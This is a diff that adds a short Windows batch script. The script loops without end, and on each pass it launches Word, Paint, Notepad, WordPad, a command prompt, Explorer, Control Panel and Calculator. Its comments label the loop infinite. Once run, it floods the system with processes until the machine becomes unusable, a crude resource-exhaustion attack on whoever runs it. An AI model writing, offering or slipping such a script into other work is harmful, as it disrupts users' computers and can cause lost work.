@@ -1,0 +1,11 @@
+@echo off
+:X //label
+start winword //MS word
+start mspaint //paint
+start notepad
+start write //wordpad
+start cmd //cmd prompt
+start explorer
+start control //panel
+start calc //calculater
+goto x //infinite loop
